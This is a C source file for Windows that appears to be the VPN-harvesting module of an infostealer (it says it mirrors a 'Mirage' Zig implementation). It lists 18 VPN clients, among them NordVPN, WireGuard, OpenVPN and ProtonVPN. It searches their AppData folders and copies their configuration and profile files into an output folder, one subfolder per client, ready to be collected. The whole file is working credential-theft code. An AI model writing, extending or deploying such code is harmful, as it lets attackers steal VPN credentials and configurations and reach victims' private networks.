#include "vpn.h"
#include "config.h"
#include <windows.h>

#ifdef ENABLE_VPN_NORDVPN
#include <stdio.h>
#include <string.h>

#define VPN_MAX_PATH 512
#define VPN_MAX_CLIENTS 18

/* ------------------------------------------------------------------ */
/*  VPN client table (mirrors Mirage vpn.zig)                         */
/* ------------------------------------------------------------------ */

typedef struct {
    const char *name;       /* display name                            */
    const char *subdir;     /* relative dir under base                 */
    const char *ext;        /* file extension filter (NULL = all)      */
    int         use_local;  /* 1 = LOCALAPPDATA, 0 = APPDATA           */
} VpnEntry;

static const VpnEntry vpn_table[VPN_MAX_CLIENTS] = {
    { "NordVPN",                  "NordVPN",                     NULL,    0 },
    { "OpenVPN",                  "OpenVPN Connect\\profiles",   "ovpn",  0 },
    { "WireGuard",                "WireGuard\\Configurations",   "conf",  0 },
    { "SurfShark",                "Surfshark",                   NULL,    1 },
    { "ExpressVPN",               "ExpressVPN",                  NULL,    0 },
    { "CyberGhost",               "CyberGhost",                  NULL,    0 },
    { "PIA",                      "Private Internet Access",     "json",  0 },
    { "Mullvad",                  "Mullvad VPN",                 "json",  0 },
    { "Windscribe",               "Windscribe",                  "cfg",   0 },
    { "TunnelBear",               "TunnelBear",                  NULL,    1 },
    { "Hotspot Shield",           "Hotspot Shield",              "cfg",   1 },
    { "VyprVPN",                  "VyprVPN",                     "dat",   0 },
    { "Hamachi",                  "Hamachi",                     "conf",  0 },
    { "HideMyName",               "Hide My Name",                "xml",   0 },
    { "IPVanish",                 "IPVanish",                    "dat",   0 },
    { "RadminVPN",                "Radmin VPN",                  "xml",   0 },
    { "SoftEther",                "SoftEther VPN Client",        "config", 0 },
    { "ProtonVPN",                "ProtonVPN",                   NULL,    1 },
};

/* ------------------------------------------------------------------ */
/*  Helpers                                                           */
/* ------------------------------------------------------------------ */

static int dir_exists(const char *path) {
    char pattern[VPN_MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE hFind;
    int found;

    snprintf(pattern, sizeof(pattern), "%s\\*", path);
    hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return 0;
    FindClose(hFind);

    /* Confirm at least one entry exists (the "." entry always exists
       for real directories, but FindFirstFileA succeeds for files too,
       so check for DIRECTORY flag on at least one result). */
    found = 0;
    hFind = FindFirstFileA(pattern, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                found = 1;
                break;
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
    return found;
}

/* Case-insensitive extension match against a filename. */
static int has_ext(const char *filename, const char *ext) {
    const char *dot;
    if (!ext) return 1;  /* no filter — accept everything */
    dot = strrchr(filename, '.');
    if (!dot) return 0;
    dot++;
    return _stricmp(dot, ext) == 0;
}

/* Create directory recursively (single extra level is enough for VPN
   output dirs like "vpn\\NordVPN"). */
static void ensure_dir(const char *path) {
    CreateDirectoryA(path, NULL);
}

/* ------------------------------------------------------------------ */
/*  Core collection logic                                             */
/* ------------------------------------------------------------------ */

/* Copy all matching files from src_dir into dst_dir.  Returns count. */
static int copy_matching_files(const char *src_dir, const char *dst_dir,
                               const char *ext) {
    char pattern[VPN_MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE hFind;
    int count = 0;

    snprintf(pattern, sizeof(pattern), "%s\\*", src_dir);
    hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return 0;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            continue;
        if (!has_ext(fd.cFileName, ext))
            continue;

        char src_path[VPN_MAX_PATH];
        char dst_path[VPN_MAX_PATH];
        snprintf(src_path, sizeof(src_path), "%s\\%s", src_dir, fd.cFileName);
        snprintf(dst_path, sizeof(dst_path), "%s\\%s", dst_dir, fd.cFileName);

        if (CopyFileA(src_path, dst_path, FALSE))
            count++;
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    return count;
}

int vpn_collect(const char *output_dir) {
    char local[VPN_MAX_PATH];
    char roaming[VPN_MAX_PATH];
    const char *appdata;
    int total = 0;

    if (!output_dir)
        return -1;

    /* Resolve AppData paths.  LOCALAPPDATA is preferred for "local"
       clients, APPDATA for "roaming" clients. */
    appdata = getenv("APPDATA");
    if (appdata)
        snprintf(roaming, sizeof(roaming), "%s", appdata);
    else
        roaming[0] = '\0';

    appdata = getenv("LOCALAPPDATA");
    if (appdata)
        snprintf(local, sizeof(local), "%s", appdata);
    else
        local[0] = '\0';

    /* Base output: <output_dir>\vpn */
    char vpn_base[VPN_MAX_PATH];
    snprintf(vpn_base, sizeof(vpn_base), "%s\\vpn", output_dir);
    ensure_dir(vpn_base);

    for (int i = 0; i < VPN_MAX_CLIENTS; i++) {
        const VpnEntry *e = &vpn_table[i];
        const char *base = e->use_local ? local : roaming;

        if (!base[0])
            continue;

        char src_dir[VPN_MAX_PATH];
        snprintf(src_dir, sizeof(src_dir), "%s\\%s", base, e->subdir);

        if (!dir_exists(src_dir))
            continue;

        /* Create per-client output directory: vpn\NordVPN, vpn\WireGuard, ... */
        char dst_dir[VPN_MAX_PATH];
        snprintf(dst_dir, sizeof(dst_dir), "%s\\%s", vpn_base, e->name);
        ensure_dir(dst_dir);

        total += copy_matching_files(src_dir, dst_dir, e->ext);
    }

    return total;
}

#endif /* ENABLE_VPN_NORDVPN */
